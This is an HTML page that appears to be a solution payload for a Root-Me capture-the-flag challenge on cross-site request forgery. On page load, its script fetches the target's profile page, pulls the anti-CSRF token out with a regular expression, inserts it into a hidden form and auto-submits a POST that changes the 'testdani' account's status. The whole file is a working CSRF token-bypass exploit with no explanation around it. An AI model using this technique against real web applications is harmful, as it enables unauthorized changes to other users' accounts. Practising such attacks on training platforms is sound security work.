<!DOCTYPE html>
<html>
<head>
    <title>Dani</title>
</head>

<body onload="get()">

<form id="form-payload" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="testdani"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="token" name="token" value=""/>
  <input type="submit" value="ok"/>
</form>


<script>
	var x = new XMLHttpRequest();

	x.onreadystatechange = function() 
	{
	  if (x.readyState == XMLHttpRequest.DONE) 
	  {
	    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
	    document.getElementById("token").value = token;
	    document.getElementById("form-payload").submit();
	  }
	}


	function get() 
	{
	  x.open("GET","?action=profile",true);
	  x.send(null); 
	}

</script>

</body>
</html>